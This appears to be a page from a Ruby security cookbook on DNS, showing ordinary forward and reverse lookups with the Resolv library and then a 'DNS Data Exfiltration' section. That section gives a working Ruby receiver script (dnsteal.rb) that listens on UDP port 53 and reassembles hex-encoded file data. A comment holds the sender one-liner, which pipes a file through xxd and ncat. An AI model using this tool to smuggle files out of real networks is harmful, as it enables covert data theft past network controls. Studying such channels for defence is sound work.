# DNS 

## DNS lookup 
### Forward DNS lookup (Host to IP)
```ruby
require 'resolv'
Resolv.getaddresses "rubyfu.net"
```

Returns array of all IPs
```
["23.23.122.48", "107.20.161.48", "174.129.41.187"]
```

or use `Resolv.getaddress` to get one address only


### Reverse DNS lookup (IP to Host)
```ruby
require 'resolv'
Resolv.getnames "23.23.122.48"
```

Returns array of all hostnames, if PTR is assigned 
```
["ec2-174-129-41-187.compute-1.amazonaws.com"]
```

or use `Resolv.name` to get one name only


## DNS Data Exfiltration 
DNS out-band connection is usually allowed in local networks, which is the major benefits of using DNS to transfer data to external server. 

**dnsteal.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
# for hex in $(xxd -p ethernet-cable.jpg); do echo $hex | ncat -u localhost 53 ; done
# 
require 'socket'

if ARGV.size < 1
  puts "[+] sudo ruby #{__FILE__} <FILENAME>"
  exit
else
  file = ARGV[0]
end

# Open UDP Socket and bind it to port 53 on all interfaces
udpsoc = UDPSocket.new
udpsoc.bind('0.0.0.0', 53)

begin

  data     = ''
  data_old = ''
  
  loop do
    response = udpsoc.recvfrom(1000)
    response = response[0].force_encoding("ISO-8859-1").encode("utf-8")
    data = response.match(/[^<][a-f0-9]([a-f0-9]).*[a-f0-9]([a-f0-9])/i).to_s
    
    # Write received data to file
    File.open(file, 'a') do |d|
      d.write [data].pack("H*") unless data == data_old     # Don't write the same data twice(poor workaround)
      puts data unless data == data_old
    end
    
    data_old = data 
  end

rescue Exception => e
  puts e
end
```

Run it 
```
ruby dnsteal.rb image.jpg
```




<br><br><br>
---
- [dnsteal.py](https://github.com/m57/dnsteal)